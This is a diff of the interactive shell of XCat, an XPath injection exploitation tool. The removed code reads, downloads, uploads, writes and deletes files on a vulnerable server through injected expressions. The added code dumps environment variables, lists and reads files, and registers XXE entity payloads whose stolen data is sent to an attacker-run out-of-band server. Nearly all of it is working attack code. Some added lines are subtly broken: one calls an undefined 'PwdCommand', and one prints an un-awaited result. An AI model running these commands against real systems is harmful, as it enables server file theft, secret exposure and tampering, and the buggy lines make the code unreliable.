@@ -1,251 +1,339 @@
-import base64
-import pathlib
-import shlex
-import sys
-from collections import namedtuple
-from os.path import expanduser
+import asyncio
+from typing import List, Dict, Set, FrozenSet
 
-from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+import click
+from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
-from tqdm import tqdm
-from xpath import E
-from xpath.functions import (available_environment_variables, concat,
-                             current_date_time, doc, doc_available,
-                             document_uri, environment_variable, resolve_uri,
-                             string, string_length, substring, unparsed_text,
-                             unparsed_text_available, unparsed_text_lines)
-from xpath.functions.fs import (append_binary, base_64_binary, delete,
-                                read_binary, write_text)
-from xpath.functions.saxon import read_binary_resource
+from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+from prompt_toolkit.completion import WordCompleter
+from prompt_toolkit.eventloop.defaults import use_asyncio_event_loop
+from prompt_toolkit.styles import Style
 
-from xcat.algorithms import (count, get_file_via_entity_injection, get_nodes,
-                             get_string, get_string_via_oob, iterate_all,
-                             upload_file_via_oob)
-from xcat.display import display_xml
+import appdirs
+import shlex
 
+from pathlib import Path
 
-class CommandFailed(RuntimeError):
-    pass
+from xcat import oob
+from . import algorithms, display
+from xpath import func, E
+from .attack import AttackContext, check
 
 
-async def throwfailed(coro):
-    if not await coro:
-        raise CommandFailed()
+class BaseCommand:
+    name: str
+    alias: List[str] = []
+    help_text: str
+    args: List[str] = []
+    required_features: FrozenSet[str] = frozenset()
+    context: AttackContext
+
+    def __init__(self, context: AttackContext):
+        self.context = context
+
+    def print_usage(self):
+        args = ' '.join(f'[{a}]' for a in self.args)
+        print(f'Usage: {self.name} {args}')
+
+    async def run(self, args):
+        raise NotImplementedError()
+
+    def has_features(self, current_features: Dict[str, bool]):
+        if not self.required_features:
+            return True
+        return any(current_features[f] for f in self.required_features)
+
+    @classmethod
+    def help_display(cls):
+        if cls.args:
+            args = ' '.join(f'[{a}]' for a in cls.args)
+            return f'{args} - {cls.help_text}'
+        return cls.help_text
 
 
-async def find_file_by_name(requester, file_name):
-    for i in range(10):
-        path = ('../' * i) + file_name
-        print(path)
+class Env(BaseCommand):
+    name = 'env'
+    help_text = 'Read environment variables'
+    required_features = {'environment-variables'}
 
-        path_expression = resolve_uri(path, document_uri(E('/')))
+    async def run(self, args):
+        expr = func.available_environment_variables()
+        total = await algorithms.count(self.context, expr)
+        for name_expr in expr[:total + 1]:
+            env_name = await algorithms.get_string(self.context, name_expr)
+            print(env_name, '=', end='')
+            value_expr = func.environment_variable(name_expr)
+            env_value = await algorithms.get_string(self.context, value_expr)
+            print(env_value)
 
-        if requester.features['doc-function']:
-            if await requester.check(doc_available(path_expression)):
-                print('XML file {path} available'.format(path=path))
 
-        if requester.features['unparsed-text']:
-            if await requester.check(unparsed_text_available(path_expression)):
-                print('Text file {path} available'.format(path=path))
+class Pwd(BaseCommand):
+    name = 'pwd'
+    help_text = 'Get current working directory'
+    required_features = {'document-uri', 'base-uri'}
 
-
-async def download_file(requester, remote_path, local_path):
-    local_path = pathlib.Path(local_path)
-    if local_path.exists():
-        print('{local_path} already exists! Not overwriting'.format(local_path=local_path))
-        return
-
-    func = read_binary if requester.features['expath-file'] else read_binary_resource
-    expression = string(func(remote_path))
-
-    print('Downloading {remote_path} to {local_path}'.format(remote_path=remote_path, local_path=local_path))
-
-    size = await count(requester, expression, func=string_length)
-    print('Size: {size}'.format(size=size))
-
-    CHUNK_SIZE = 5 * 1024
-    result = ""
-    for index in tqdm(range(1, size + 1, CHUNK_SIZE)):
-        data = await get_string_via_oob(requester, substring(expression, index, CHUNK_SIZE))
-        if data is None:
-            raise CommandFailed('Failed to download chunk {index}. Giving up. Sorry.'.format(index=index))
+    @staticmethod
+    def cwd_expression(features):
+        if features['base-uri']:
+            return func.base_uri()
         else:
-            result += data
-        sys.stdout.flush()
-    sys.stdout.write('\n')
-    local_path.write_bytes(base64.decodebytes(result.encode()))
-    print('Downloaded, saved to {local_path}'.format(local_path=local_path))
+            return func.document_uri(E('/'))
+
+    async def run(self, args):
+        expr = self.cwd_expression(self.context.features)
+        print(await algorithms.get_string(self.context, expr))
 
 
-async def read_env(requester):
-    all_exp = available_environment_variables()
-    total = await count(requester, all_exp)
-    env_output = [
-        concat(env_name, ' = ', environment_variable(env_name))
-        for env_name in all_exp[:total + 1]
-    ]
-    for variable in iterate_all(requester, env_output):
-        print(await variable)
+class Get(BaseCommand):
+    name = 'get'
+    help_text = 'Fetch a specific node by xpath expression'
+    args = ['expression']
+
+    async def run(self, args):
+        expression = args[0]
+        await display.display_xml(
+            algorithms.get_nodes(self.context, E(expression))
+        )
 
 
-async def cat(requester, path):
-    if requester.features['unparsed-text']:
-        if not await requester.check(unparsed_text_available(path)):
-            print('File {path} doesn\'t seem to be available.'.format(path=path))
-            if input('Continue anyway? [y/n] ').lower() != 'y':
+class GetString(BaseCommand):
+    name = 'get-string'
+    help_text = 'Fetch a specific string by xpath expression'
+    args = ['expression']
+
+    async def run(self, args):
+        expression = args[0]
+        print(algorithms.get_string(self.context, E(expression)))
+
+
+class Time(BaseCommand):
+    name = 'time'
+    help_text = 'Get the current date+time of the server'
+    required_features = {'current-datetime'}
+
+    async def run(self, args):
+        print(await algorithms.get_string(self.context,
+                                          func.string(func.current_dateTime())))
+
+
+class Cat(BaseCommand):
+    name = 'cat'
+    alias = ['ls']
+    help_text = 'Read a file or directory'
+    args = ['path']
+    required_features = {'unparsed-text'}
+
+    async def run(self, args):
+        if not args:
+            path = PwdCommand.cwd_expression(self.context.features)
+        else:
+            path = args[0]
+        available = await check(self.context, func.unparsed_text_available(path))
+        if not available:
+            print(f'File {path} does not seem to be available')
+            if input('Try anyway? [y/n]').lower() != 'y':
                 return
 
-        if requester.features['oob-http']:
-            # Fetch in one go
-            expression = unparsed_text(path)
-            print(await get_string_via_oob(requester, expression))
+        expr = func.unparsed_text_lines(path)
+        length = await algorithms.count(self.context, expr)
+        print(f'Lines: {length}')
+        for line in algorithms.iterate_all(self.context, expr[:length + 1], disable_normalization=True):
+            print(await line)
+
+
+class ToggleFeature(BaseCommand):
+    name = 'toggle'
+    help_text = 'Toggle features on or off'
+
+    async def run(self, args):
+        if not args:
+            print('Usage: toggle [feature name]')
+            print('Available features and values:')
+            for feature, enabled in self.context.features.items():
+                click.echo(f'{feature} = ', nl=False)
+                click.echo(
+                    click.style(
+                        'on' if enabled else 'off',
+                        'bright_green' if enabled else 'red'
+                    )
+                )
         else:
-            # Line by line
-            expression = unparsed_text_lines(path)
-            length = await count(requester, expression)
-            print('Lines: {length}'.format(length=length))
-            for line in iterate_all(requester, expression[:length + 1]):
-                print(await line)
-    elif requester.features['oob-entity-injection']:
-        path = 'file://{path}'.format(path=path)
-        print('Fetching {path}'.format(path=path))
-        print(await get_file_via_entity_injection(requester, path))
+            feature_name = args[0]
+            current_value = self.context.features[feature_name]
+            self.context.features[feature_name] = not current_value
+            print(f'{feature_name} now {"on" if not current_value else "off"}')
 
 
-async def upload_file(requester, local_path, remote_path):
-    local_path = pathlib.Path(local_path)
-    if not local_path.exists():
-        print('Cannot find {local_path}!'.format(local_path=local_path))
-        return
+class Resolve(BaseCommand):
+    name = 'resolve'
+    help_text = 'Resolve a file name to an absolute URI'
+    args = ['path']
 
-    print('Uploading {local_path} to {remote_path}'.format(local_path=local_path, remote_path=remote_path))
-    data = local_path.read_bytes()
-    print('Length: {len} bytes'.format(len=len(data)))
-
-    if requester.features['oob-http']:
-        print(await upload_file_via_oob(requester, remote_path, data))
-    else:
-        chunks = list(split_chunks(data, 1024))
-        print('Uploading {chunks} chunks'.format(chunks=len(chunks)))
-
-        await requester.check(delete(remote_path))
-
-        for i, chunk in enumerate(tqdm(chunks), 1):
-            chunk = base64.b64encode(chunk).decode()
-            for _ in range(5):
-                if await count(requester, append_binary(remote_path, base_64_binary(chunk)) == 0):
-                    break
-                else:
-                    continue
-            else:
-                raise CommandFailed('Failed to upload chunk {i} 5 times. Giving up. Sorry.'.format(i=i))
-
-        sys.stdout.write('\n')
+    async def run(self, args):
+        if not args:
+            return self.print_usage()
+        path = args[0]
+        expr = func.resolve_uri(path, func.document_uri(E('/')))
+        print(await algorithms.get_string(self.context, expr))
 
 
-async def show_help(requester):
-    for command in COMMANDS:
-        print(' * {command.name} - {command.help_display}'.format(command=command))
-        print('   {command.help_text}'.format(command=command))
+class Find(BaseCommand):
+    name = 'find'
+    help_text = 'Find a file by name in parent directories'
+    args = ['name']
+
+    async def run(self, args):
+        if not args:
+            return self.print_usage()
+        name = args[0]
+        for i in range(10):
+            rel_path = ('../' * i) + name
+            print(f'Searching for {rel_path}')
+            expr = func.resolve_uri(rel_path, func.document_uri(E('/')))
+            if await check(self.context, func.doc_available(expr)):
+                click.echo(click.style(f'XML file {rel_path} available', 'bright_green'))
+            elif await check(self.context, func.unparsed_text_available(expr)):
+                click.echo(click.style(f'Text file {rel_path} available', 'bright_green'))
 
 
-class Command(namedtuple('Command', 'name args help_text function feature_test')):
-    @property
-    def help_display(self):
-        return ' '.join('"{arg}"'.format(arg=arg) for arg in self.args)
+class OOBExpectData(BaseCommand):
+    name = 'expect-data'
+    help_text = 'Add an entry to the OOB server to expect some data'
+
+    async def run(self, args):
+        if not self.context.oob_app:
+            print('Error: OOB server is not enabled')
+            return
+        identifier, _ = oob.expect_data(self.context.oob_app)
+        print(f'Identifier created: {identifier}')
+        print(f'Hitting {self.context.oob_host}/data/{identifier}?d=[DATA] will save this data')
+        print(f'Use {GetOOBData.name} {identifier} to retrieve it')
 
 
-COMMANDS = [
-    Command('get', ['xpath-expression'], 'Fetch a specific node by xpath expression',
-            lambda requester, expression: display_xml(get_nodes(requester, E(expression))), None),
-    Command('get_string', ['xpath-expression'], 'Fetch a specific string by xpath expression',
-            lambda requester, expression: get_string(requester, E(expression)), None),
-    Command('pwd', [], 'Get the URI of the current document',
-            lambda requester: get_string(requester, document_uri(E('/'))), ['document-uri']),
-    Command('time', [], 'Get the current date+time of the server',
-            lambda requester: get_string(requester, string(current_date_time())), ['current-datetime']),
-    Command('rm', ['path'], 'Delete a file by path',
-            lambda requester, path: throwfailed(count(requester, delete(path))), ['expath-file']),
-    Command('write-text', ['location', 'text'], 'Write text to location',
-            lambda requester, location, text: throwfailed(requester.check(write_text(location, text))),
-            ['expath-file']),
-    Command('cat_xml', ['path'], 'Read an XML file at "location"',
-            lambda requester, location: display_xml(get_nodes(requester, doc(location) / '*')), ['doc-function']),
-    Command('find-file', ['file-name'], 'Find a file by name in parent directories',
-            find_file_by_name, ['unparsed-text', 'doc-function']),
-    Command('download', ['remote-path', 'local-path'], 'Download a file from remote-path to local-path',
-            download_file, lambda f: (f['expath-file'] or f['saxon']) and f['oob-http']),
-    Command('upload', ['local-path', 'remote-path'], 'Upload file from local-path to remote-path',
-            upload_file, ['expath-file']),
-    Command('env', [], 'Read environment variables', read_env, ['environment-variables']),
-    Command('cat', ['path'], 'Read a file (including network resources like ftp/http)', cat, None),
-    Command('ls', ['path'], 'Read a directory', cat, None),
-    Command('help', [], 'Display help', show_help, None)
-]
+class OOBExpectEntity(BaseCommand):
+    name = 'expect-entity-injection'
+    help_text = 'Add an entry to the OOB server to expect a SYSTEM entity injection'
+    args = ['file_path']
 
-command_dict = {
-    command.name: command
-    for command in COMMANDS
-}
+    async def run(self, args):
+        if not args:
+            return self.print_usage()
+        if not self.context.oob_app:
+            print('Error: OOB server is not enabled')
+            return
+        file_path = args[0]
+        identifier, _ = oob.expect_entity_injection(self.context.oob_app, f'SYSTEM "{file_path}"')
+        print(f'Identifier created: {identifier}')
+        print(f'Hitting {self.context.oob_host}/entity/{identifier} will server a XXE page')
+        print(f'Hitting {self.context.oob_host}/data/{identifier}?d=[DATA] will save the data')
+        print(f'Use {GetOOBData.name} {identifier} to retrieve it')
 
 
-async def run_shell(requester):
-    if not sys.stdout.isatty():
-        print('Stdout is not a tty! Cannot open shell', file=sys.stderr)
-        return
+class GetOOBData(BaseCommand):
+    name = 'get-oob-data'
+    help_text = 'Get OOB data from an identifier'
+    args = ['identifier']
 
-    history = FileHistory(expanduser('~/.xcat_history'))
+    async def run(self, args):
+        if not args:
+            return self.print_usage()
+        if not self.context.oob_app:
+            print('Error: OOB server is not enabled')
+            return
+        identifier = args[0]
+        if identifier not in self.context.oob_app['expectations']:
+            print(f'Error: {identifier} not found. Did you register it with {OOBExpectData.name}?')
+            return
+        # Bit hacky
+        future: asyncio.Future = self.context.oob_app['expectations'][identifier]
+        if not future.done():
+            print(f'Error: {identifier} has received no data yet.')
+        else:
+            print(f'Data received for {identifier}:')
+            print(future.result())
 
-    completer = WordCompleter(list(command_dict.keys()),
-                              meta_dict={
-                              command.name: '{command.help_display} - {command.help_text}'.format(command=command)
-                              for command in COMMANDS},
-                              sentence=True)
 
-    print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
+class Exit(BaseCommand):
+    name = 'exit'
+    help_text = 'Quit the shell'
+
+    async def run(self, args):
+        exit(0)
+
+
+class Help(BaseCommand):
+    name = 'help'
+    help_text = 'Get help'
+
+    async def run(self, args):
+        print('Available commands:')
+        for command in BaseCommand.__subclasses__():
+            click.echo(click.style(command.name, 'bright_green'), nl=False)
+            print(f': {command.help_display()}')
+
+
+async def shell_loop(context: AttackContext):
+    use_asyncio_event_loop()
+    history_dir = Path(appdirs.user_data_dir('python-xcat'))
+    if not history_dir.exists():
+        history_dir.mkdir(parents=True)
+    history = FileHistory(history_dir / 'history')
+    session = PromptSession(history=history)
+
+    commands: Dict[str, BaseCommand] = {
+        c.name: c(context)
+        for c in BaseCommand.__subclasses__()
+    }
+
+    for c in BaseCommand.__subclasses__():
+        for alias in c.alias:
+            commands[alias] = commands[c.name]
+
+    completer = WordCompleter(
+        commands.keys(),
+        meta_dict={
+            name: command.help_display()
+            for name, command in commands.items()
+        },
+        sentence=True
+    )
+    style = Style.from_dict({
+        'prompt': '#884444',
+        'dollar': '#00aa00'
+    })
+
     while True:
-        cmd = await prompt_async('>> ', patch_stdout=True, completer=completer, history=history,
-                                 auto_suggest=AutoSuggestFromHistory())
-        await run_shell_command(requester, cmd)
+        user_input = await session.prompt(
+            [
+                ('class:prompt', 'XCat'),
+                ('class:dollar', '$ ')
+            ],
+            style=style,
+            async_=True,
+            completer=completer,
+            auto_suggest=AutoSuggestFromHistory(),
+            enable_history_search=True
+        )
 
+        split_input = shlex.split(user_input)
+        if not split_input:
+            continue
 
-async def run_shell_command(requester, cmd):
-    command = shlex.split(cmd)
-    if not command:
-        return
-    elif len(command) == 1:
-        name, args = command[0], []
-    else:
-        name, args = command[0], command[1:]
+        name, args = split_input[0], split_input[1:]
 
-    if name not in command_dict:
-        print('Command {name} not found, try "help"'.format(name=name))
-    else:
-        command = command_dict[name]
+        if name not in commands:
+            print(f'Unknown command {name}. Use "help" to get help')
+            continue
 
-    features_required = command.feature_test
-    if callable(features_required):
-        has_required_features = features_required(requester.features)
-    elif isinstance(features_required, (tuple, list)):
-        has_required_features = any(requester.features[f] for f in features_required)
-    elif features_required is None:
-        has_required_features = True
-    else:
-        raise RuntimeError(
-            'Unhandled features_required: {features_required}'.format(features_required=features_required))
+        command = commands[name]
 
-    if not has_required_features:
-        print('Cannot use command {command.name}, not all required features are present in this injection'.format(
-            command=command))
-        return
-
-    try:
-        await command.function(requester, *args)
-    except CommandFailed as e:
-        print('Error! Command appeared to fail: {e}'.format(e=e))
-
-
-def split_chunks(l, n):
-    """Yield successive n-sized chunks from l."""
-    for i in range(0, len(l), n):
-        yield l[i:i + n]
+        if not command.has_features(context.features):
+            print(click.style('Error: ', 'red'), end='')
+            print(f'Cannot use {name} as not all features are '
+                  f'present in this injection')
+            if command.required_features:
+                print('Required features: ', end='')
+                print(click.style(', '.join(command.required_features), 'red'))
+                print('Use toggle_feature to force these on')
+        else:
+            await command.run(args)
